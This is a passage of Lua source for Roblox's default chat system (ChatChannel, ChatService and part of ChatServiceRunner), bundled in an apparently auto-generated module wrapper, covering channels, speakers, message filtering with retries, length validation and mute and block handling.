					if speaker.Name == fromSpeaker.Name then
						-- Send unfiltered message to speaker who sent the message.
						local cMessageObj = ShallowCopy(messageObj)
						if userShouldMuteUnfilteredMessage then
							local messageLength = messageObj.MessageLengthUtf8 or messageObj.MessageLength
							cMessageObj.Message = string.rep("_", messageLength)
						else
							cMessageObj.Message = message
						end
						cMessageObj.IsFiltered = true
						-- We need to claim the message is filtered even if it not in this case for compatibility with legacy client side code.
						speaker:InternalSendMessage(cMessageObj, self.Name)
					else
						speaker:InternalSendMessage(messageObj, self.Name)
					end
				end
			end
		
			local success, err = pcall(function() self.eMessagePosted:Fire(messageObj) end)
			if not success and err then
				print("Error posting message: " ..err)
			end
		
			local textFilterContext = self.Private and Enum.TextFilterContext.PrivateChat or Enum.TextFilterContext.PublicChat
			local filterSuccess, isFilterResult, filteredMessage = self.ChatService:InternalApplyRobloxFilterNewAPI(
				messageObj.FromSpeaker,
				message,
				textFilterContext
			)
			if (filterSuccess) then
				messageObj.FilterResult = filteredMessage
				messageObj.IsFilterResult = isFilterResult
			else
				return false
			end
			messageObj.IsFiltered = true
			self:InternalAddMessageToHistoryLog(messageObj)
		
			for _, speakerName in pairs(sentToList) do
				local speaker = self.Speakers[speakerName]
				if (speaker) then
					speaker:InternalSendFilteredMessageWithFilterResult(messageObj, self.Name)
				end
			end
		
			-- One more pass is needed to ensure that no speakers do not recieve the message.
			-- Otherwise a user could join while the message is being filtered who had not originally been sent the message.
			local speakersMissingMessage = {}
			for _, speaker in pairs(self.Speakers) do
				local isMuted = speaker:IsSpeakerMuted(fromSpeaker.Name)
				if not isMuted and self:CanCommunicate(fromSpeaker, speaker) then
					local wasSentMessage = false
					for _, sentSpeakerName in pairs(sentToList) do
						if speaker.Name == sentSpeakerName then
							wasSentMessage = true
							break
						end
					end
					if not wasSentMessage then
						table.insert(speakersMissingMessage, speaker.Name)
					end
				end
			end
		
			for _, speakerName in pairs(speakersMissingMessage) do
				local speaker = self.Speakers[speakerName]
				if speaker then
					speaker:InternalSendFilteredMessageWithFilterResult(messageObj, self.Name)
				end
			end
		
			return messageObj
		end
		
		function methods:InternalAddSpeaker(speaker)
			if (self.Speakers[speaker.Name]) then
				warn("Speaker \"" .. speaker.name .. "\" is already in the channel!")
				return
			end
		
			self.Speakers[speaker.Name] = speaker
			local success, err = pcall(function() self.eSpeakerJoined:Fire(speaker.Name) end)
			if not success and err then
				print("Error removing channel: " ..err)
			end
		end
		
		function methods:InternalRemoveSpeaker(speaker)
			if (not self.Speakers[speaker.Name]) then
				warn("Speaker \"" .. speaker.name .. "\" is not in the channel!")
				return
			end
		
			self.Speakers[speaker.Name] = nil
			local success, err = pcall(function() self.eSpeakerLeft:Fire(speaker.Name) end)
			if not success and err then
				print("Error removing speaker: " ..err)
			end
		end
		
		function methods:InternalRemoveExcessMessagesFromLog()
			local remove = table.remove
			while (#self.ChatHistory > self.MaxHistory) do
				remove(self.ChatHistory, 1)
			end
		end
		
		function methods:InternalAddMessageToHistoryLog(messageObj)
			table.insert(self.ChatHistory, messageObj)
		
			self:InternalRemoveExcessMessagesFromLog()
		end
		
		function methods:GetMessageType(message, fromSpeaker)
			if fromSpeaker == nil then
				return ChatConstants.MessageTypeSystem
			end
			return ChatConstants.MessageTypeDefault
		end
		
		function methods:InternalCreateMessageObject(message, fromSpeaker, isFiltered, extraData)
			local messageType = self:GetMessageType(message, fromSpeaker)
		
			local speakerUserId = -1
			local speakerDisplayName = nil
			local speaker = nil
		
			if fromSpeaker then
				speaker = self.ChatService:GetSpeaker(fromSpeaker)
				if speaker then
					local player = speaker:GetPlayer()
					if player then
						speakerUserId = player.UserId
		
						if ChatSettings.PlayerDisplayNamesEnabled then
							speakerDisplayName = speaker:GetNameForDisplay()
						end
					else
						speakerUserId = 0
					end
				end
			end
		
			local messageObj =
			{
				ID = self.ChatService:InternalGetUniqueMessageId(),
				FromSpeaker = fromSpeaker,
				SpeakerDisplayName = speakerDisplayName,
				SpeakerUserId = speakerUserId,
				OriginalChannel = self.Name,
				MessageLength = string.len(message),
				MessageLengthUtf8 = utf8.len(utf8.nfcnormalize(message)),
				MessageType = messageType,
				IsFiltered = isFiltered,
				Message = isFiltered and message or nil,
				--// These two get set by the new API. The comments are just here
				--// to remind readers that they will exist so it's not super
				--// confusing if they find them in the code but cannot find them
				--// here.
				--FilterResult = nil,
				--IsFilterResult = false,
				Time = os.time(),
				ExtraData = {},
			}
		
			if speaker then
				for k, v in pairs(speaker.ExtraData) do
					messageObj.ExtraData[k] = v
				end
			end
		
			if (extraData) then
				for k, v in pairs(extraData) do
					messageObj.ExtraData[k] = v
				end
			end
		
			return messageObj
		end
		
		function methods:SetChannelNameColor(color)
			self.ChannelNameColor = color
			for i, speaker in pairs(self.Speakers) do
				speaker:UpdateChannelNameColor(self.Name, color)
			end
		end
		
		function methods:GetWelcomeMessageForSpeaker(speaker)
			if self.GetWelcomeMessageFunction then
				local welcomeMessage = self.GetWelcomeMessageFunction(speaker)
				if welcomeMessage then
					return welcomeMessage
				end
			end
			return self.WelcomeMessage
		end
		
		function methods:RegisterGetWelcomeMessageFunction(func)
			if type(func) ~= "function" then
				error("RegisterGetWelcomeMessageFunction must be called with a function.")
			end
			self.GetWelcomeMessageFunction = func
		end
		
		function methods:UnRegisterGetWelcomeMessageFunction()
			self.GetWelcomeMessageFunction = nil
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new(vChatService, name, welcomeMessage, channelNameColor)
			local obj = setmetatable({}, methods)
		
			obj.ChatService = vChatService
		
			obj.Name = name
			obj.WelcomeMessage = welcomeMessage or ""
			obj.GetWelcomeMessageFunction = nil
			obj.ChannelNameColor = channelNameColor
		
			obj.Joinable = true
			obj.Leavable = true
			obj.AutoJoin = false
			obj.Private = false
		
			obj.Speakers = {}
			obj.Mutes = {}
		
			obj.MaxHistory = 200
			obj.HistoryIndex = 0
			obj.ChatHistory = {}
		
			obj.FilterMessageFunctions = Util:NewSortedFunctionContainer()
			obj.ProcessCommandsFunctions = Util:NewSortedFunctionContainer()
		
			-- Make sure to destroy added binadable events in the InternalDestroy method.
			obj.eDestroyed = Instance.new("BindableEvent")
			obj.eMessagePosted = Instance.new("BindableEvent")
			obj.eSpeakerJoined = Instance.new("BindableEvent")
			obj.eSpeakerLeft = Instance.new("BindableEvent")
			obj.eSpeakerMuted = Instance.new("BindableEvent")
			obj.eSpeakerUnmuted = Instance.new("BindableEvent")
		
			obj.MessagePosted = obj.eMessagePosted.Event
			obj.SpeakerJoined = obj.eSpeakerJoined.Event
			obj.SpeakerLeft = obj.eSpeakerLeft.Event
			obj.SpeakerMuted = obj.eSpeakerMuted.Event
			obj.SpeakerUnmuted = obj.eSpeakerUnmuted.Event
			obj.Destroyed = obj.eDestroyed.Event
		
			return obj
		end
		
		return module
		
	end[chat_service] = function()
		--	// FileName: ChatService.lua
		--	// Written by: Xsitsu
		--	// Description: Manages creating and destroying ChatChannels and Speakers.
		
		local MAX_FILTER_RETRIES = 3
		local FILTER_BACKOFF_INTERVALS = {50/1000, 100/1000, 200/1000}
		local MAX_FILTER_DURATION = 60
		
		--- Constants used to decide when to notify that the chat filter is having issues filtering messages.
		local FILTER_NOTIFCATION_THRESHOLD = 3 --Number of notifcation failures before an error message is output.
		local FILTER_NOTIFCATION_INTERVAL = 60 --Time between error messages.
		local FILTER_THRESHOLD_TIME = 60 --If there has not been an issue in this many seconds, the count of issues resets.
		
		local module = {}
		
		local RunService = game:GetService("RunService")
		local Chat = game:GetService("Chat")
		local ReplicatedModules = Chat:WaitForChild("ClientChatModules")
		
		local modulesFolder = script.Parent
		local ReplicatedModules = Chat:WaitForChild("ClientChatModules")
		local ChatSettings = require(ReplicatedModules:WaitForChild("ChatSettings"))
		
		local errorTextColor = ChatSettings.ErrorMessageTextColor or Color3.fromRGB(245, 50, 50)
		local errorExtraData = {ChatColor = errorTextColor}
		
		--////////////////////////////// Include
		--//////////////////////////////////////
		local ChatConstants = require(ReplicatedModules:WaitForChild("ChatConstants"))
		
		local ChatChannel = require(modulesFolder:WaitForChild("ChatChannel"))
		local Speaker = require(modulesFolder:WaitForChild("Speaker"))
		local Util = require(modulesFolder:WaitForChild("Util"))
		
		local ChatLocalization = nil
		pcall(function() ChatLocalization = require(game:GetService("Chat").ClientChatModules.ChatLocalization) end)
		ChatLocalization = ChatLocalization or {}
		
		if not ChatLocalization.FormatMessageToSend or not ChatLocalization.LocalizeFormattedMessage then
			function ChatLocalization:FormatMessageToSend(key,default) return default end
		end
		
		local function allSpaces(inputString)
			local testString = string.gsub(inputString, " ", "")
			return string.len(testString) == 0
		end
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local methods = {}
		methods.__index = methods
		
		function methods:AddChannel(channelName, autoJoin)
			if (self.ChatChannels[channelName:lower()]) then
				error(string.format("Channel %q alrady exists.", channelName))
			end
		
			local function DefaultChannelCommands(fromSpeaker, message)
				if (message:lower() == "/leave") then
					local channel = self:GetChannel(channelName)
					local speaker = self:GetSpeaker(fromSpeaker)
					if (channel and speaker) then
						if (channel.Leavable) then
							speaker:LeaveChannel(channelName)
							local msg = ChatLocalization:FormatMessageToSend(
								"GameChat_ChatService_YouHaveLeftChannel",
								string.format("You have left channel '%s'", channelName),
								"RBX_NAME",
								channelName)
							speaker:SendSystemMessage(msg, "System")
						else
							speaker:SendSystemMessage(ChatLocalization:FormatMessageToSend("GameChat_ChatService_CannotLeaveChannel","You cannot leave this channel."), channelName)
						end
					end
		
					return true
				end
				return false
			end
		
		
			local channel = ChatChannel.new(self, channelName)
			self.ChatChannels[channelName:lower()] = channel
		
			channel:RegisterProcessCommandsFunction("default_commands", DefaultChannelCommands, ChatConstants.HighPriority)
		
			local success, err = pcall(function() self.eChannelAdded:Fire(channelName) end)
			if not success and err then
				print("Error addding channel: " ..err)
			end
		
			if autoJoin ~= nil then
				channel.AutoJoin = autoJoin
				if autoJoin then
					for _, speaker in pairs(self.Speakers) do
						speaker:JoinChannel(channelName)
					end
				end
			end
		
			return channel
		end
		
		function methods:RemoveChannel(channelName)
			if (self.ChatChannels[channelName:lower()]) then
				local n = self.ChatChannels[channelName:lower()].Name
		
				self.ChatChannels[channelName:lower()]:InternalDestroy()
				self.ChatChannels[channelName:lower()] = nil
		
				local success, err = pcall(function() self.eChannelRemoved:Fire(n) end)
				if not success and err then
					print("Error removing channel: " ..err)
				end
			else
				warn(string.format("Channel %q does not exist.", channelName))
			end
		end
		
		function methods:GetChannel(channelName)
			return self.ChatChannels[channelName:lower()]
		end
		
		
		function methods:AddSpeaker(speakerName)
			if (self.Speakers[speakerName:lower()]) then
				error("Speaker \"" .. speakerName .. "\" already exists!")
			end
		
			local speaker = Speaker.new(self, speakerName)
			self.Speakers[speakerName:lower()] = speaker
		
			local success, err = pcall(function() self.eSpeakerAdded:Fire(speakerName) end)
			if not success and err then
				print("Error adding speaker: " ..err)
			end
		
			return speaker
		end
		
		function methods:InternalUnmuteSpeaker(speakerName)
			for channelName, channel in pairs(self.ChatChannels) do
				if channel:IsSpeakerMuted(speakerName) then
					channel:UnmuteSpeaker(speakerName)
				end
			end
		end
		
		function methods:RemoveSpeaker(speakerName)
			if (self.Speakers[speakerName:lower()]) then
				local n = self.Speakers[speakerName:lower()].Name
		
				self:InternalUnmuteSpeaker(n)
		
				self.Speakers[speakerName:lower()]:InternalDestroy()
				self.Speakers[speakerName:lower()] = nil
		
				local success, err = pcall(function() self.eSpeakerRemoved:Fire(n) end)
				if not success and err then
					print("Error removing speaker: " ..err)
				end
		
			else
				warn("Speaker \"" .. speakerName .. "\" does not exist!")
			end
		end
		
		function methods:GetSpeaker(speakerName)
			return self.Speakers[speakerName:lower()]
		end
		
		function methods:GetSpeakerByUserOrDisplayName(speakerName)
			local speakerByUserName = self.Speakers[speakerName:lower()]
		
			if speakerByUserName then
				return speakerByUserName
			end
		
			for _, potentialSpeaker in pairs(self.Speakers) do
				local player = potentialSpeaker:GetPlayer()
		
				if player and player.DisplayName:lower() == speakerName:lower() then
					return potentialSpeaker
				end
			end
		end
		
		function methods:GetChannelList()
			local list = {}
			for i, channel in pairs(self.ChatChannels) do
				if (not channel.Private) then
					table.insert(list, channel.Name)
				end
			end
			return list
		end
		
		function methods:GetAutoJoinChannelList()
			local list = {}
			for i, channel in pairs(self.ChatChannels) do
				if channel.AutoJoin then
					table.insert(list, channel)
				end
			end
			return list
		end
		
		function methods:GetSpeakerList()
			local list = {}
			for i, speaker in pairs(self.Speakers) do
				table.insert(list, speaker.Name)
			end
			return list
		end
		
		function methods:SendGlobalSystemMessage(message)
			for i, speaker in pairs(self.Speakers) do
				speaker:SendSystemMessage(message, nil)
			end
		end
		
		function methods:RegisterFilterMessageFunction(funcId, func, priority)
			if self.FilterMessageFunctions:HasFunction(funcId) then
				error(string.format("FilterMessageFunction '%s' already exists", funcId))
			end
			self.FilterMessageFunctions:AddFunction(funcId, func, priority)
		end
		
		function methods:FilterMessageFunctionExists(funcId)
			return self.FilterMessageFunctions:HasFunction(funcId)
		end
		
		function methods:UnregisterFilterMessageFunction(funcId)
			if not self.FilterMessageFunctions:HasFunction(funcId) then
				error(string.format("FilterMessageFunction '%s' does not exists", funcId))
			end
			self.FilterMessageFunctions:RemoveFunction(funcId)
		end
		
		function methods:RegisterProcessCommandsFunction(funcId, func, priority)
			if self.ProcessCommandsFunctions:HasFunction(funcId) then
				error(string.format("ProcessCommandsFunction '%s' already exists", funcId))
			end
			self.ProcessCommandsFunctions:AddFunction(funcId, func, priority)
		end
		
		function methods:ProcessCommandsFunctionExists(funcId)
			return self.ProcessCommandsFunctions:HasFunction(funcId)
		end
		
		function methods:UnregisterProcessCommandsFunction(funcId)
			if not self.ProcessCommandsFunctions:HasFunction(funcId) then
				error(string.format("ProcessCommandsFunction '%s' does not exist", funcId))
			end
			self.ProcessCommandsFunctions:RemoveFunction(funcId)
		end
		
		local LastFilterNoficationTime = 0
		local LastFilterIssueTime = 0
		local FilterIssueCount = 0
		function methods:InternalNotifyFilterIssue()
			if (tick() - LastFilterIssueTime) > FILTER_THRESHOLD_TIME then
				FilterIssueCount = 0
			end
			FilterIssueCount = FilterIssueCount + 1
			LastFilterIssueTime = tick()
			if FilterIssueCount >= FILTER_NOTIFCATION_THRESHOLD then
				if (tick() - LastFilterNoficationTime) > FILTER_NOTIFCATION_INTERVAL then
					LastFilterNoficationTime = tick()
					local systemChannel = self:GetChannel("System")
					if systemChannel then
						systemChannel:SendSystemMessage(
							ChatLocalization:FormatMessageToSend(
								"GameChat_ChatService_ChatFilterIssues",
								"The chat filter is currently experiencing issues and messages may be slow to appear."
							),
							errorExtraData
						)
					end
				end
			end
		end
		
		local StudioMessageFilteredCache = {}
		
		--///////////////// Internal-Use Methods
		--//////////////////////////////////////
		--DO NOT REMOVE THIS. Chat must be filtered or your game will face
		--moderation.
		function methods:InternalApplyRobloxFilter(speakerName, message, toSpeakerName) --// USES FFLAG
			if (RunService:IsServer() and not RunService:IsStudio()) then
				local fromSpeaker = self:GetSpeaker(speakerName)
				local toSpeaker = toSpeakerName and self:GetSpeaker(toSpeakerName)
		
				if fromSpeaker == nil then
					return nil
				end
		
				local fromPlayerObj = fromSpeaker:GetPlayer()
				local toPlayerObj = toSpeaker and toSpeaker:GetPlayer()
		
				if fromPlayerObj == nil then
					return message
				end
		
				if allSpaces(message) then
					return message
				end
		
				local filterStartTime = tick()
				local filterRetries = 0
				while true do
					local success, message = pcall(function()
						if toPlayerObj then
							return Chat:FilterStringAsync(message, fromPlayerObj, toPlayerObj)
						else
							return Chat:FilterStringForBroadcast(message, fromPlayerObj)
						end
					end)
					if success then
						return message
					else
						warn("Error filtering message:", message)
					end
					filterRetries = filterRetries + 1
					if filterRetries > MAX_FILTER_RETRIES or (tick() - filterStartTime) > MAX_FILTER_DURATION then
						self:InternalNotifyFilterIssue()
						return nil
					end
					local backoffInterval = FILTER_BACKOFF_INTERVALS[math.min(#FILTER_BACKOFF_INTERVALS, filterRetries)]
					-- backoffWait = backoffInterval +/- (0 -> backoffInterval)
					local backoffWait = backoffInterval + ((math.random()*2 - 1) * backoffInterval)
					wait(backoffWait)
				end
			else
				--// Simulate filtering latency.
				--// There is only latency the first time the message is filtered, all following calls will be instant.
				if not StudioMessageFilteredCache[message] then
					StudioMessageFilteredCache[message] = true
					wait()
				end
				return message
			end
		
			return nil
		end
		
		--// Return values: bool filterSuccess, bool resultIsFilterObject, variant result
		function methods:InternalApplyRobloxFilterNewAPI(speakerName, message, textFilterContext) --// USES FFLAG
			local alwaysRunFilter = false
			local runFilter = RunService:IsServer() and not RunService:IsStudio()
			if (alwaysRunFilter or runFilter) then
		
				local fromSpeaker = self:GetSpeaker(speakerName)
				if fromSpeaker == nil then
					return false, nil, nil
				end
		
				local fromPlayerObj = fromSpeaker:GetPlayer()
				if fromPlayerObj == nil then
					return true, false, message
				end
		
				if allSpaces(message) then
					return true, false, message
				end
		
				local success, filterResult = pcall(function()
					local ts = game:GetService("TextService")
					local result = ts:FilterStringAsync(message, fromPlayerObj.UserId, textFilterContext)
					return result
				end)
				if (success) then
					return true, true, filterResult
				else
					warn("Error filtering message:", message, filterResult)
					self:InternalNotifyFilterIssue()
					return false, nil, nil
				end
			end
		
			--// Simulate filtering latency.
			wait()
			return true, false, message
		end
		
		function methods:InternalDoMessageFilter(speakerName, messageObj, channel)
			local filtersIterator = self.FilterMessageFunctions:GetIterator()
		
			for funcId, func, priority in filtersIterator do
				local success, errorMessage = pcall(function()
					func(speakerName, messageObj, channel)
				end)
		
				if not success then
					warn(string.format("DoMessageFilter Function '%s' failed for reason: %s", funcId, errorMessage))
				end
			end
		end
		
		function methods:InternalDoProcessCommands(speakerName, message, channel)
			local commandsIterator = self.ProcessCommandsFunctions:GetIterator()
		
			for funcId, func, priority in commandsIterator do
				local success, returnValue = pcall(function()
					local ret = func(speakerName, message, channel)
					if type(ret) ~= "boolean" then
						error("Process command functions must return a bool")
					end
					return ret
				end)
		
				if not success then
					warn(string.format("DoProcessCommands Function '%s' failed for reason: %s", funcId, returnValue))
				elseif returnValue then
					return true
				end
			end
		
			return false
		end
		
		function methods:InternalGetUniqueMessageId()
			local id = self.MessageIdCounter
			self.MessageIdCounter = id + 1
			return id
		end
		
		function methods:InternalAddSpeakerWithPlayerObject(speakerName, playerObj, fireSpeakerAdded)
			if (self.Speakers[speakerName:lower()]) then
				error("Speaker \"" .. speakerName .. "\" already exists!")
			end
		
			local speaker = Speaker.new(self, speakerName)
			speaker:InternalAssignPlayerObject(playerObj)
			self.Speakers[speakerName:lower()] = speaker
		
			if fireSpeakerAdded then
				local success, err = pcall(function() self.eSpeakerAdded:Fire(speakerName) end)
				if not success and err then
					print("Error adding speaker: " ..err)
				end
			end
		
			return speaker
		end
		
		function methods:InternalFireSpeakerAdded(speakerName)
			local success, err = pcall(function() self.eSpeakerAdded:Fire(speakerName) end)
			if not success and err then
				print("Error firing speaker added: " ..err)
			end
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new()
			local obj = setmetatable({}, methods)
		
			obj.MessageIdCounter = 0
		
			obj.ChatChannels = {}
			obj.Speakers = {}
		
			obj.FilterMessageFunctions = Util:NewSortedFunctionContainer()
			obj.ProcessCommandsFunctions = Util:NewSortedFunctionContainer()
		
			obj.eChannelAdded = Instance.new("BindableEvent")
			obj.eChannelRemoved = Instance.new("BindableEvent")
			obj.eSpeakerAdded = Instance.new("BindableEvent")
			obj.eSpeakerRemoved = Instance.new("BindableEvent")
		
			obj.ChannelAdded = obj.eChannelAdded.Event
			obj.ChannelRemoved = obj.eChannelRemoved.Event
			obj.SpeakerAdded = obj.eSpeakerAdded.Event
			obj.SpeakerRemoved = obj.eSpeakerRemoved.Event
		
			obj.ChatServiceMajorVersion = 0
			obj.ChatServiceMinorVersion = 5
		
			return obj
		end
		
		return module.new()
		
	end
}

--// Scripts

-- cqrwfrafaw
task.spawn(function()
	local script = cqrwfrafaw
	script.Disabled = true

	script:GetPropertyChangedSignal("Disabled"):Wait()

	local oldreq = require
	local function require(target)
		if modules[target] then
			return modules[target]()
		end
		return oldreq(target)
	end

	--	// FileName: ChatServiceRunner.lua
	--	// Written by: Xsitsu
	--	// Description: Main script to initialize ChatService and run ChatModules.
	
	local EventFolderName = "DefaultChatSystemChatEvents"
	local EventFolderParent = game:GetService("ReplicatedStorage")
	local modulesFolder = script
	
	local PlayersService = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local Chat = game:GetService("Chat")
	
	local ChatService = require(modulesFolder:WaitForChild("ChatService"))
	
	local ReplicatedModules = Chat:WaitForChild("ClientChatModules")
	local ChatSettings = require(ReplicatedModules:WaitForChild("ChatSettings"))
	
	local ChatLocalization = nil
	pcall(function() ChatLocalization = require(Chat.ClientChatModules.ChatLocalization) end)
	ChatLocalization = ChatLocalization or {}
	
	local MAX_CHANNEL_NAME_LENGTH = ChatSettings.MaxChannelNameCheckLength or 50
	local MAX_MESSAGE_LENGTH = ChatSettings.MaximumMessageLength
	local MAX_BYTES_PER_CODEPOINT = 6
	
	if not ChatLocalization.FormatMessageToSend or not ChatLocalization.LocalizeFormattedMessage then
		function ChatLocalization:FormatMessageToSend(key,default) return default end
	end
	
	local MAX_BLOCKED_SPEAKERS_PER_REQ = 50
	
	local useEvents = {}
	
	local EventFolder = EventFolderParent:FindFirstChild(EventFolderName)
	if (not EventFolder) then
		EventFolder = Instance.new("Folder")
		EventFolder.Name = EventFolderName
		EventFolder.Archivable = false
		EventFolder.Parent = EventFolderParent
	end
	
	local function validateMessageLength(msg)
	    if msg:len() > MAX_MESSAGE_LENGTH*MAX_BYTES_PER_CODEPOINT then
	        return false
	    end
	
	    if utf8.len(msg) == nil then
	        return false
	    end
	
	    if utf8.len(utf8.nfcnormalize(msg)) > MAX_MESSAGE_LENGTH then
	        return false
	    end
	
	    return true
	end
	
	local function validateChannelNameLength(channelName)
	    if channelName:len() > MAX_CHANNEL_NAME_LENGTH*MAX_BYTES_PER_CODEPOINT then
	        return false
	    end
	
	    if utf8.len(channelName) == nil then
	        return false
	    end
	
	    if utf8.len(utf8.nfcnormalize(channelName)) > MAX_CHANNEL_NAME_LENGTH then
	        return false
	    end
	
	    return true
	end
	
	--// No-opt connect Server>Client RemoteEvents to ensure they cannot be called
	--// to fill the remote event queue.
	local function emptyFunction()
		--intentially empty
	end
	
	local function GetObjectWithNameAndType(parentObject, objectName, objectType)
		for _, child in pairs(parentObject:GetChildren()) do
			if (child:IsA(objectType) and child.Name == objectName) then
				return child
			end
		end
	
		return nil
	end
	
	local function CreateIfDoesntExist(parentObject, objectName, objectType)
		local obj = GetObjectWithNameAndType(parentObject, objectName, objectType)
		if (not obj) then
			obj = Instance.new(objectType)
			obj.Name = objectName
			obj.Parent = parentObject
		end
		useEvents[objectName] = obj
	
		return obj
	end
	
	--// All remote events will have a no-opt OnServerEvent connecdted on construction
	local function CreateEventIfItDoesntExist(parentObject, objectName)
		local obj = CreateIfDoesntExist(parentObject, objectName, "RemoteEvent")
		obj.OnServerEvent:Connect(emptyFunction)
		return obj
	end
	
	CreateEventIfItDoesntExist(EventFolder, "OnNewMessage")
	CreateEventIfItDoesntExist(EventFolder, "OnMessageDoneFiltering")
	CreateEventIfItDoesntExist(EventFolder, "OnNewSystemMessage")
	CreateEventIfItDoesntExist(EventFolder, "OnChannelJoined")
	CreateEventIfItDoesntExist(EventFolder, "OnChannelLeft")
	CreateEventIfItDoesntExist(EventFolder, "OnMuted")
	CreateEventIfItDoesntExist(EventFolder, "OnUnmuted")
	CreateEventIfItDoesntExist(EventFolder, "OnMainChannelSet")
	CreateEventIfItDoesntExist(EventFolder, "ChannelNameColorUpdated")
	
	CreateEventIfItDoesntExist(EventFolder, "SayMessageRequest")
	CreateEventIfItDoesntExist(EventFolder, "SetBlockedUserIdsRequest")
	CreateIfDoesntExist(EventFolder, "GetInitDataRequest", "RemoteFunction")
	CreateIfDoesntExist(EventFolder, "MutePlayerRequest", "RemoteFunction")
	CreateIfDoesntExist(EventFolder, "UnMutePlayerRequest", "RemoteFunction")
	
	EventFolder = useEvents
	
	local function CreatePlayerSpeakerObject(playerObj)
		--// If a developer already created a speaker object with the
		--// name of a player and then a player joins and tries to
		--// take that name, we first need to remove the old speaker object
		local speaker = ChatService:GetSpeaker(playerObj.Name)
		if (speaker) then
			ChatService:RemoveSpeaker(playerObj.Name)
		end
	
		speaker = ChatService:InternalAddSpeakerWithPlayerObject(playerObj.Name, playerObj, false)
	
		for _, channel in pairs(ChatService:GetAutoJoinChannelList()) do
			speaker:JoinChannel(channel.Name)
		end
	
		speaker:InternalAssignEventFolder(EventFolder)
	
		speaker.ChannelJoined:connect(function(channel, welcomeMessage)
			local log = nil
			local channelNameColor = nil
	
			local channelObject = ChatService:GetChannel(channel)
			if (channelObject) then
				log = channelObject:GetHistoryLogForSpeaker(speaker)
				channelNameColor = channelObject.ChannelNameColor
			end
			EventFolder.OnChannelJoined:FireClient(playerObj, channel, welcomeMessage, log, channelNameColor)
		end)
	
		speaker.Muted:connect(function(channel, reason, length)
			EventFolder.OnMuted:FireClient(playerObj, channel, reason, length)
		end)
	
		speaker.Unmuted:connect(function(channel)
			EventFolder.OnUnmuted:FireClient(playerObj, channel)
		end)
	
		ChatService:InternalFireSpeakerAdded(speaker.Name)
	end
	
	EventFolder.SayMessageRequest.OnServerEvent:connect(function(playerObj, message, channel)
		if type(message) ~= "string" then
			return
		elseif not validateMessageLength(message) then
			return
		end
	
		if type(channel) ~= "string" then
			return
		elseif not validateChannelNameLength(channel) then
			return
		end
	
		local speaker = ChatService:GetSpeaker(playerObj.Name)
		if (speaker) then
			return speaker:SayMessage(message, channel)
		end
	
		return nil
	end)
	
	EventFolder.MutePlayerRequest.OnServerInvoke = function(playerObj, muteSpeakerName)
		if type(muteSpeakerName) ~= "string" then
			return
		end
	
		local speaker = ChatService:GetSpeaker(playerObj.Name)
		if speaker then
			local muteSpeaker = ChatService:GetSpeaker(muteSpeakerName)
			if muteSpeaker then
				speaker:AddMutedSpeaker(muteSpeaker.Name)
				return true
			end
		end
		return false
	end
	
	EventFolder.UnMutePlayerRequest.OnServerInvoke = function(playerObj, unmuteSpeakerName)
		if type(unmuteSpeakerName) ~= "string" then
			return
		end
	
		local speaker = ChatService:GetSpeaker(playerObj.Name)
		if speaker then
			local unmuteSpeaker = ChatService:GetSpeaker(unmuteSpeakerName)
			if unmuteSpeaker then
				speaker:RemoveMutedSpeaker(unmuteSpeaker.Name)
				return true
			end
		end
		return false
	end
	
	-- Map storing Player -> Blocked user Ids.
	local BlockedUserIdsMap = {}
	
	PlayersService.PlayerAdded:connect(function(newPlayer)
		for player, blockedUsers in pairs(BlockedUserIdsMap) do
			local speaker = ChatService:GetSpeaker(player.Name)
			if speaker then
				for i = 1, #blockedUsers do
					local blockedUserId = blockedUsers[i]
					if blockedUserId == newPlayer.UserId then
						speaker:AddMutedSpeaker(newPlayer.Name)
					end
				end
			end
		end
	end)
	
	PlayersService.PlayerRemoving:connect(function(removingPlayer)
		BlockedUserIdsMap[removingPlayer] = nil
	end)
	
	EventFolder.SetBlockedUserIdsRequest.OnServerEvent:Connect(function(player, blockedUserIdsList)
		if type(blockedUserIdsList) ~= "table" then
			return
		end
	
		local prunedBlockedUserIdsList = {}
		local speaker = ChatService:GetSpeaker(player.Name)
		if speaker then
			for i = 1, math.min(#blockedUserIdsList, MAX_BLOCKED_SPEAKERS_PER_REQ) do
				if type(blockedUserIdsList[i]) == "number" then
	
					table.insert(prunedBlockedUserIdsList, blockedUserIdsList[i])
	
					local blockedPlayer = PlayersService:GetPlayerByUserId(blockedUserIdsList[i])
					if blockedPlayer then
						speaker:AddMutedSpeaker(blockedPlayer.Name)
					end
				end
			end
	
			-- We only want to store the first
			-- MAX_BLOCKED_SPEAKERS_PER_REQ number of ids as needed
			BlockedUserIdsMap[player] = prunedBlockedUserIdsList
		end
	end)
	
	EventFolder.GetInitDataRequest.OnServerInvoke = (function(playerObj)
		local speaker = ChatService:GetSpeaker(playerObj.Name)
		if not (speaker and speaker:GetPlayer()) then
			CreatePlayerSpeakerObject(playerObj)
			speaker = ChatService:GetSpeaker(playerObj.Name)
		end
	
		local data = {}
		data.Channels = {}
		data.SpeakerExtraData = {}
	
		for _, channelName in pairs(speaker:GetChannelList()) do
			local channelObj = ChatService:GetChannel(channelName)
			if (channelObj) then
				local channelData =
				{
					channelName,
					channelObj:GetWelcomeMessageForSpeaker(speaker),
					channelObj:GetHistoryLogForSpeaker(speaker),
					channelObj.ChannelNameColor,
				}
	
				table.insert(data.Channels, channelData)
			end
		end
	
		for _, oSpeakerName in pairs(ChatService:GetSpeakerList()) do
			local oSpeaker = ChatService:GetSpeaker(oSpeakerName)
			data.SpeakerExtraData[oSpeakerName] = oSpeaker.ExtraData
		end
	
		return data
	end)
	
	local function DoJoinCommand(speakerName, channelName, fromChannelName)
		local speaker = ChatService:GetSpeaker(speakerName)
		local channel = ChatService:GetChannel(channelName)
	
		if (speaker) then
			if (channel) then
				if (channel.Joinable) then
					if (not speaker:IsInChannel(channel.Name)) then
						speaker:JoinChannel(channel.Name)
					else
						speaker:SetMainChannel(channel.Name)
						local msg = ChatLocalization:FormatMessageToSend(
							"GameChat_SwitchChannel_NowInChannel",
							string.format("You are now chatting in channel: '%s'", channel.Name),
							"RBX_NAME",
							channel.Name)
						speaker:SendSystemMessage(msg, channel.Name)
					end
				else
					local msg = ChatLocalization:FormatMessageToSend(
						"GameChat_ChatServiceRunner_YouCannotJoinChannel",
						"You cannot join channel '" .. channelName .. "'.",
						"RBX_NAME",
						channelName)
					speaker:SendSystemMessage(msg, fromChannelName)
				end
			else
				local msg = ChatLocalization:FormatMessageToSend(
